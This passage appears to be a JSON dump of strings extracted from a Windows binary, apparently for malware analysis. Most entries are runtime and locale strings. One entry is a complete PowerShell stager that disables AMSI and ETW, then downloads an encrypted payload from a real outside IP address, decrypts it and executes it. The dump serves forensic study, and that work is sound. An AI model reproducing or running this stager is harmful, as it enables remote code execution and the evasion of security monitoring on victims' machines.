                "?F?U?g?z?",
                "0D0c0}0",
                "1%1>1",
                "1L2S2t2",
                "2(323_3p3",
                "9O:h:m:v:",
                ".090C0R0Z0b0",
                "2\"3C3",
                ";L=9???Q?\\?",
                "7l7t7",
                "?E?^?",
                ")0S0|0",
                "152e2",
                "3d3(4",
                "5P5]8",
                "=f>m>t>{>",
                "0S2v2",
                "4/4F4L4",
                "6-6x6",
                ";.<2>",
                "0\"1b1",
                "2+2<2J2U2",
                "9$929G9",
                "<%=w=",
                "=P>k>~>",
                "?%?+?r?",
                "0$1)1.131Y1",
                "394A4S4X4",
                "6'6g6o6",
                "8\"9O9}9",
                "9R:r:",
                "=+>A>",
                "?-?O?",
                "2H2h2s2",
                "3B4a4s4}4",
                "4I5o5",
                "7h8u8",
                ">9>O>",
                "?6?I?S?l?",
                "0=1Q1",
                "1A2L2X2",
                "t3|3",
                "3M7X8`8",
                "223:3u3|3",
                "A3I3",
                "7 8(8_8f8",
                ".9590:7:",
                ";]<o<",
                "=#=5=",
                "1P2W3",
                "9:9K9\\9",
                "\"0+0",
                "575}5",
                "6W647",
                ":y;$<",
                "9n:t:",
                "?E?P?",
                "=0z0",
                "6s6}6",
                "9Y:m:",
                "<:<f<s<",
                "= >a>p>",
                ".0a0~0",
                "3\\3s3",
                "434=4{4",
                "466W6e6",
                "757;7C7Q7",
                "7?8M8_8~8",
                "0G1\\1e1n1",
                ":C;};",
                "I0+2",
                "3L4a7\"8(848R8X8",
                "9;9A9M9l9r9",
                ";y<g=l=",
                "> ?J?R?o?",
                "2$282C2",
                "5_6h6",
                "859D9P9_9r9",
                "9 :):2:;:f:",
                ":\\;a;i;",
                ";/=~=",
                "=?>c>",
                "0$0*00060<0B0H0N0T0Z0`0f0l0r0x0~0",
                "1 1&1,12181>1D1J1P1V1\\1b1h1n1t1z1",
                "1V2[2m2",
                "9':b:",
                ":B;S;",
                "3575;5?5C5G5K5O5S5W5[5_5c5g5k5o5s5w5{5",
                "1\"1&1*1.12161",
                "6R839",
                "3G3w3",
                "4(7,748",
                "4t5x5|5",
                "8 8(80888@8H8P8X8`8h8p8x8",
                "9 9(90989@9H9P9X9`9h9p9x9",
                ": :(:0:8:@:H:P:X:`:h:p:x:",
                "; ;(;0;8;@;H;P;X;`;h;p;x;",
                "$8(8,80848<8@8D8H8L8T8X8\\8`8d8l8p8t8x8|8",
                ":0:4:8:",
                "6 646p6x6",
                "h2l2p2t2x2|2",
                "5 5$5(5,5054585<5@5D5H5L5P5T5X5\\5`5l5p5t5x5|5",
                "6`:d:h:l:",
                "l4t4|4",
                "5$5,545<5D5L5T5\\5d5l5t5|5",
                "6$6,646<6D6L6T6\\6d6l6t6|6",
                "7$7,747<7D7L7T7\\7d7l7t7|7",
                "8$8,848<8D8L8T8\\8d8l8t8|8",
                "9$9,949<9D9L9T9\\9d9l9t9|9",
                ":$:,:4:<:D:L:T:\\:d:l:t:|:",
                ";$;,;4;<;D;L;T;\\;d;l;t;|;",
                "@9H9P9X9`9h9p9x9",
                "< <(<0<8<@<H<P<X<`<h<p<x<",
                "= =(=0=8=@=H=P=X=`=h=p=x=",
                "> >(>0>8>@>H>P>X>`>h>p>x>",
                "? ?(?0?8?@?H?P?X?`?h?p?x?",
                "0 0(00080@0H0P0X0",
                "(848@8L8X8d8p8|8",
                "9$909<9H9T9`9l9x9",
                ": :,:8:D:P:\\:h:t:",
                "< <,<8<D<P<\\<h<t<",
                "47<7D7L7T7\\7d7l7t7|7",
                "84:@:",
                "20282@2X2p2t2",
                "3,303D3L3T3l3",
                "4 484<4P4X4\\4d4|4",
                "545L5P5d5l5p5x5",
                "=,?8?\\?h?",
                "1,101<1D1P1T1`1t1",
                "2 242X2d2l2",
                "3 3(3,3P3X3\\3p3",
                "4 4$404D4h4t4",
                "585X5x5",
                "64686X6x6",
                "787X7x7",
                "8(8H8h8",
                "9(9H9h9",
                ":(:H:h:",
                ";$;(;",
                "5(585H5X5p5|5",
                "< <$<(<,<8<<<@<D<H<L<P<T<h<$?H?l?",
                "1 1<1X1x1",
                "jjjj",
                "jjjjj",
                "CLRCreateInstance failed w/hr 0x%08lx",
                "v4.0.30319",
                "ICLRMetaHost::GetRuntime failed w/hr 0x%08lx",
                "ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx",
                ".NET runtime v2.0.50727 cannot be loaded",
                "ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx",
                "CLR failed to start w/hr 0x%08lx",
                "ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx",
                "Failed to get default AppDomain w/hr 0x%08lx",
                "Failed to load the assembly w/hr 0x%08lx",
                "Failed to get the Type interface w/hr 0x%08lx",
                "If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADQANgAuADEAOQAwAC4AMQAyADAALgAyADEANwA6ADEAMwAzADUA')));$t='/login/process.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('e.-1h+#~k3<*cJnjHdNz=7tVywWYSI%X');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add(\"Cookie\",\"jnjnWM=GFNX6aqfKPmLIww9fEIdXtLQSkE=\");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ",
                "amsi.dll",
                "SafeArrayPutElement failed w/hr 0x%08lx",
                "Failed to invoke InvokePS w/hr 0x%08lx",
                "Runtime Check Error.",
                " Unable to display RTC Message.",
                "bin\\MSPDB140.DLL",
                "api-ms-win-core-registry-l1-1-0.dll",
                "advapi32.dll",
                "SOFTWARE\\Wow6432Node\\Microsoft\\VisualStudio\\14.0\\Setup\\VC",
                "ProductDir",
                "api-ms-win-core-fibers-l1-1-1",
                "api-ms-win-core-synch-l1-2-0",
                "kernel32",
                "api-ms-",
                "api-ms-win-core-datetime-l1-1-1",
                "api-ms-win-core-file-l1-2-2",
                "api-ms-win-core-localization-l1-2-1",
                "api-ms-win-core-localization-obsolete-l1-2-0",
                "api-ms-win-core-processthreads-l1-1-2",
                "api-ms-win-core-string-l1-1-0",
                "api-ms-win-core-sysinfo-l1-2-1",
                "api-ms-win-core-winrt-l1-1-0",
                "api-ms-win-core-xstate-l2-1-0",
                "api-ms-win-rtcore-ntuser-window-l1-1-0",
                "api-ms-win-security-systemfunctions-l1-1-0",
                "ext-ms-win-ntuser-dialogbox-l1-1-0",
                "ext-ms-win-ntuser-windowstation-l1-1-0",
                "advapi32",
                "ntdll",
                "api-ms-win-appmodel-runtime-l1-1-2",
                "user32",
                "ext-ms-",
                "LC_ALL",
                "LC_COLLATE",
                "LC_CTYPE",
                "LC_MONETARY",
                "LC_NUMERIC",
                "LC_TIME",
                "en-US",
                "ja-JP",
                "zh-CN",
                "ko-KR",
                "zh-TW",
                "         (((((                  H",
                "      (                          ",
                "zh-CHS",
                "ar-SA",
                "bg-BG",
                "ca-ES",
                "cs-CZ",
                "da-DK",
                "de-DE",
                "el-GR",
                "fi-FI",
                "fr-FR",
                "he-IL",
                "hu-HU",
                "is-IS",
                "it-IT",
                "nl-NL",
                "nb-NO",
                "pl-PL",
                "pt-BR",
                "ro-RO",
                "ru-RU",
                "hr-HR",
                "sk-SK",
                "sq-AL",
                "sv-SE",
                "th-TH",
                "tr-TR",
                "ur-PK",
                "id-ID",
                "uk-UA",
                "be-BY",
                "sl-SI",
                "et-EE",
                "lv-LV",
                "lt-LT",
                "fa-IR",
                "vi-VN",
                "hy-AM",
                "az-AZ-Latn",
                "eu-ES",
                "mk-MK",
                "tn-ZA",
                "xh-ZA",
                "zu-ZA",
                "af-ZA",
                "ka-GE",
                "fo-FO",
                "hi-IN",
                "mt-MT",
                "se-NO",
                "ms-MY",
                "kk-KZ",
                "ky-KG",
                "sw-KE",
                "uz-UZ-Latn",
                "tt-RU",
                "bn-IN",
                "pa-IN",
                "gu-IN",
                "ta-IN",
                "te-IN",
                "kn-IN",
                "ml-IN",
                "mr-IN",
                "sa-IN",
                "mn-MN",
                "cy-GB",
                "gl-ES",
                "kok-IN",
                "syr-SY",
                "div-MV",
                "quz-BO",
                "ns-ZA",
                "mi-NZ",
                "ar-IQ",
                "de-CH",
                "en-GB",
                "es-MX",
                "fr-BE",
                "it-CH",
                "nl-BE",
                "nn-NO",
                "pt-PT",
                "sr-SP-Latn",
                "sv-FI",
                "az-AZ-Cyrl",
                "se-SE",
                "ms-BN",
                "uz-UZ-Cyrl",
                "quz-EC",
                "ar-EG",
                "zh-HK",
                "de-AT",
                "en-AU",
                "es-ES",
                "fr-CA",
                "sr-SP-Cyrl",
                "se-FI",
                "quz-PE",
                "ar-LY",
                "zh-SG",
                "de-LU",
                "en-CA",
                "es-GT",
                "fr-CH",
                "hr-BA",
                "smj-NO",
                "ar-DZ",
                "zh-MO",
                "de-LI",
                "en-NZ",
                "es-CR",
                "fr-LU",
                "bs-BA-Latn",
                "smj-SE",
                "ar-MA",
                "en-IE",
                "es-PA",
                "fr-MC",
                "sr-BA-Latn",
                "sma-NO",
                "ar-TN",
                "en-ZA",
                "es-DO",
                "sr-BA-Cyrl",
                "sma-SE",
                "ar-OM",
                "en-JM",
                "es-VE",
                "sms-FI",
                "ar-YE",
                "en-CB",
                "es-CO",
                "smn-FI",
                "ar-SY",
                "en-BZ",
                "es-PE",
                "ar-JO",
                "en-TT",
                "es-AR",
                "ar-LB",
                "en-ZW",
                "es-EC",
                "ar-KW",
                "en-PH",
                "es-CL",
                "ar-AE",
                "es-UY",
                "ar-BH",
                "es-PY",
                "ar-QA",
                "es-BO",
                "es-SV",
                "es-HN",
                "es-NI",
                "es-PR",
                "zh-CHT",
                "af-za",
                "ar-ae",
                "ar-bh",
                "ar-dz",
                "ar-eg",
                "ar-iq",
                "ar-jo",
                "ar-kw",
                "ar-lb",
                "ar-ly",
                "ar-ma",
                "ar-om",
                "ar-qa",
                "ar-sa",
                "ar-sy",
                "ar-tn",
                "ar-ye",
                "az-az-cyrl",
                "az-az-latn",
                "be-by",
                "bg-bg",
                "bn-in",
                "bs-ba-latn",
                "ca-es",
                "cs-cz",
                "cy-gb",
                "da-dk",
                "de-at",
                "de-ch",
                "de-de",
                "de-li",
                "de-lu",
                "div-mv",
                "el-gr",
                "en-au",
                "en-bz",
                "en-ca",
                "en-cb",
                "en-gb",
                "en-ie",
                "en-jm",
                "en-nz",
                "en-ph",
                "en-tt",
                "en-us",
                "en-za",
                "en-zw",
                "es-ar",
                "es-bo",
                "es-cl",
                "es-co",
                "es-cr",
                "es-do",
                "es-ec",
                "es-es",
                "es-gt",
                "es-hn",
                "es-mx",
                "es-ni",
                "es-pa",
                "es-pe",
                "es-pr",
                "es-py",
                "es-sv",
                "es-uy",
                "es-ve",
                "et-ee",
                "eu-es",
                "fa-ir",
                "fi-fi",
                "fo-fo",
                "fr-be",
                "fr-ca",
                "fr-ch",
                "fr-fr",
                "fr-lu",
                "fr-mc",
                "gl-es",
                "gu-in",
                "he-il",
                "hi-in",
                "hr-ba",
                "hr-hr",
                "hu-hu",
                "hy-am",
                "id-id",
                "is-is",
                "it-ch",
                "it-it",
                "ja-jp",
                "ka-ge",
                "kk-kz",
                "kn-in",
                "kok-in",
                "ko-kr",
                "ky-kg",
                "lt-lt",
                "lv-lv",
                "mi-nz",
                "mk-mk",
                "ml-in",
                "mn-mn",
                "mr-in",
                "ms-bn",
                "ms-my",
                "mt-mt",
                "nb-no",
                "nl-be",
                "nl-nl",
                "nn-no",
                "ns-za",
                "pa-in",
                "pl-pl",
                "pt-br",
                "pt-pt",
                "quz-bo",
                "quz-ec",
                "quz-pe",
                "ro-ro",
                "ru-ru",
                "sa-in",
                "se-fi",
                "se-no",
                "se-se",
                "sk-sk",
                "sl-si",
                "sma-no",
                "sma-se",
                "smj-no",
                "smj-se",
                "smn-fi",
                "sms-fi",
                "sq-al",
                "sr-ba-cyrl",
                "sr-ba-latn",
                "sr-sp-cyrl",
                "sr-sp-latn",
                "sv-fi",
                "sv-se",
                "sw-ke",
                "syr-sy",
                "ta-in",
                "te-in",
                "th-th",
                "tn-za",
                "tr-tr",
                "tt-ru",
                "uk-ua",
                "ur-pk",
                "uz-uz-cyrl",
                "uz-uz-latn",
                "vi-vn",
                "xh-za",
                "zh-chs",
                "zh-cht",
                "zh-cn",
                "zh-hk",
                "zh-mo",
                "zh-sg",
                "zh-tw",
                "zu-za",
                "american",
                "american english",
                "american-english",
                "australian",
                "belgian",
                "canadian",
                "chinese",
                "chinese-hongkong",
                "chinese-simplified",
                "chinese-singapore",
                "chinese-traditional",
                "dutch-belgian",
                "english-american",
                "english-aus",
                "english-belize",
                "english-can",
                "english-caribbean",
                "english-ire",
                "english-jamaica",
                "english-nz",
                "english-south africa",
                "english-trinidad y tobago",
                "english-uk",
                "english-us",
                "english-usa",
                "french-belgian",
                "french-canadian",
                "french-luxembourg",
                "french-swiss",
                "german-austrian",
                "german-lichtenstein",
                "german-luxembourg",
                "german-swiss",
                "irish-english",
                "italian-swiss",
                "norwegian",
                "norwegian-bokmal",
                "norwegian-nynorsk",
                "portuguese-brazilian",
                "spanish-argentina",
                "spanish-bolivia",
                "spanish-chile",
                "spanish-colombia",
                "spanish-costa rica",
                "spanish-dominican republic",
                "spanish-ecuador",
                "spanish-el salvador",
                "spanish-guatemala",
                "spanish-honduras",
                "spanish-mexican",
                "spanish-modern",
                "spanish-nicaragua",
                "spanish-panama",
                "spanish-paraguay",
                "spanish-peru",
                "spanish-puerto rico",
                "spanish-uruguay",
                "spanish-venezuela",
                "swedish-finland",
                "swiss",
                "america",
                "britain",
                "china",
                "czech",
                "england",
                "great britain",
                "holland",
                "hong-kong",
                "new-zealand",
                "pr china",
                "pr-china",
                "puerto-rico",
                "slovak",
                "south africa",
                "south korea",
                "south-africa",
                "south-korea",
                "trinidad & tobago",
                "united-kingdom",
                "united-states",
                "utf8",
                "utf-8",
                "Runtime Error!",
                "Program: ",
                "<program name unknown>",
                "Microsoft Visual C++ Runtime Library",
                "CONOUT$",
                "out-default",
                "EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "DEBUG: ",
                "ERROR: ",
                "VERBOSE: ",
                "WARNING: ",
                "Prompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForChoice is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForCredential1 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForCredential2 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ReadLine is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ReadLineAsSecureString is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "FlushInputBuffer is not implemented.",
                "GetBufferContents is not implemented.",
                "KeyAvailable is not implemented.",
                "ReadKey is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ScrollBufferContents is not implemented",
                "SetBufferContents is not implemented.",
                "SetBufferContents is not implemented",
                "VS_VERSION_INFO",
                "VarFileInfo",
                "Translation",
                "StringFileInfo",
                "000004b0",
                "FileDescription",
                "FileVersion",
                "InternalName",
                "LegalCopyright",
                "OriginalFilename",
                "ProductName",
                "ProductVersion",
                "Assembly Version"
            ]
        }
    ]
}